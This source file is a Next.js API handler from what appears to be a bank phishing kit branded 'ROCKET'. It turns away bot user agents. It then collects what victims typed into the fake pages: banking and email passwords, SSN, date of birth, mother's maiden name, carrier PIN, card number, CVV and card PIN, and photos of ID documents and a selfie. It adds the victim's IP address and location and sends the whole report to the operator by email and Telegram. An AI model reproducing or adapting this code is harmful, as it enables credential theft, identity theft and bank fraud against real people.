import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendEmail } from "../../utils/sendEmail";
import { sendTelegram } from "../../utils/sendTelegram";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res.send(`Fuck off`);
    return;
  }

  try {
    const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);

    const front = req.files && (req.files.front as any);
    const back = req.files && (req.files.back as any);
    const selfie = req.files && (req.files.selfie as any);
    const values = req.body;
    const message = `
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<h3><strong>SESSION</strong></h3>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>LOGIN DETAILS</h4>
<p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${
      JSON.parse(values.logins[0])[`1`].loginDetails.loginAttempt
    }</b></p>
<p>| (▰˘◡˘▰) USER ID ☞ <b>${
      JSON.parse(values.logins[0])[`1`].loginDetails.userId
    }</b></p>
<p>| (▰˘◡˘▰) PASSWORD ☞ <b>${
      JSON.parse(values.logins[0])[`1`].loginDetails.password
    }</b></p>
<br>
${
  JSON.parse(values.logins[0])[`2`]
    ? `<p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${
        JSON.parse(values.logins[0])[`2`].loginDetails.loginAttempt
      }</b></p>
<p>| (▰˘◡˘▰) USER ID ☞ <b>${
        JSON.parse(values.logins[0])[`2`].loginDetails.userId
      }</b></p>
<p>| (▰˘◡˘▰) PASSWORD ☞ <b>${
        JSON.parse(values.logins[0])[`2`].loginDetails.password
      }</b></p>
<br>`
    : ``
}
${
  values.emailLogins
    ? `<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>EMAIL DETAILS</h4>
<p>| (▰˘◡˘▰) EMAIL ATTEMPT ☞ <b>${
        JSON.parse(values.emailLogins[0])["1"].emailLogins.attempt
      }</b></p>
<p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${
        JSON.parse(values.emailLogins[0])["1"].emailLogins.email
      }</b></p>
<p>| (▰˘◡˘▰) EMAIL PASSWORD ☞ <b>${
        JSON.parse(values.emailLogins[0])["1"].emailLogins.emailPassword
      }</b></p>
<br>
${
  JSON.parse(values.emailLogins[0])["2"]
    ? `<p>| (▰˘◡˘▰) EMAIL ATTEMPT ☞ <b>${
        JSON.parse(values.emailLogins[0])["2"].emailLogins.attempt
      }</b></p>
<p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${
        JSON.parse(values.emailLogins[0])["2"].emailLogins.email
      }</b></p>
<p>| (▰˘◡˘▰) EMAIL PASSWORD ☞ <b>${
        JSON.parse(values.emailLogins[0])["2"].emailLogins.emailPassword
      }</b></p>
<br>`
    : ""
}`
    : ``
}
${
  values.billing
    ? `<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>BILLING</h4>
<p>| (▰˘◡˘▰) FIRST NAME ☞ <b>${JSON.parse(values.billing[0]).firstname}</b></p>
<p>| (▰˘◡˘▰) LAST NAME ☞ <b>${JSON.parse(values.billing[0]).lastname}</b></p>
<p>| (▰˘◡˘▰) SSN ☞ <b>${JSON.parse(values.billing[0]).ssn}</b></p>
<p>| (▰˘◡˘▰) DOB ☞ <b>${JSON.parse(values.billing[0]).dob}</b></p>
<p>| (▰˘◡˘▰) STREET ADDRESS ☞ <b>${
        JSON.parse(values.billing[0]).streetAddress
      }</b></p>
<p>| (▰˘◡˘▰) MOTHER MAIDEN NAME ☞ <b>${
        JSON.parse(values.billing[0]).mmn || ``
      }</b></p>
<p>| (▰˘◡˘▰) ZIP CODE ☞ <b>${JSON.parse(values.billing[0]).zipCode}</b></p>
<p>| (▰˘◡˘▰) STATE ☞ <b>${JSON.parse(values.billing[0]).state}</b></p>
<p>| (▰˘◡˘▰) CARRIER PIN ☞ <b>${
        JSON.parse(values.billing[0]).carrierPin || ``
      }</b></p>
<br>`
    : ``
}
${
  values.cardDetails
    ? `<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>CARD DETAILS</h4>
<p>| (▰˘◡˘▰) CARD NUMBER ☞ <b>${
        JSON.parse(values.cardDetails[0]).cardNumber
      }</b></p>
<p>| (▰˘◡˘▰) EXPIRATION DATE ☞ <b>${
        JSON.parse(values.cardDetails[0]).expirationDate
      }</b></B></p>
<p>| (▰˘◡˘▰) CVV ☞ <b>${JSON.parse(values.cardDetails[0]).cvv}</b></p>
<p>| (▰˘◡˘▰) CARD PIN ☞ <b>${JSON.parse(values.cardDetails[0]).cardPin}</b></p>
<p>| (▰˘◡˘▰) PHONE NUMBER ☞ <b>${
        JSON.parse(values.cardDetails[0]).phoneNumber
      }</b></p>
<br>
${
  req.files && (req.files.front || req.files.back)
    ? ` <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>SUPPORTING DOCUMENTS${selfie ? ` & SELFIE` : ``}</h4>
<p>| (▰˘◡˘▰) See attached files</b></p>
<br>`
    : ``
}`
    : ``
}
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
    `;

    if (process.env.TO) {
      await sendEmail(
        message,
        `${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`,
        req.files && (front || back)
          ? [
              {
                filename: `Front.${
                  front[0].headers[`content-type`].split(`/`)[1]
                }`,
                content: front[0],
              },
              {
                filename: `Back.${
                  back[0].headers[`content-type`].split(`/`)[1]
                }`,
                content: back[0],
              },
              ...(selfie
                ? [
                    {
                      filename: `Selfie.${
                        selfie[0].headers[`content-type`].split(`/`)[1]
                      }`,
                      content: selfie[0],
                    },
                  ]
                : []),
            ]
          : []
      );
    }

    if (process.env.TELEGRAM_ID) {
      await sendTelegram({
        message: `
        ${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}
        ${message}
      `,
        medias:
          req.files && (front || back)
            ? [front[0], back[0], ...(selfie ? [selfie[0]] : [])]
            : undefined,
      });
    }
  } catch (error) {
    console.log(error);
  }

  res.send(`OK`);
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;
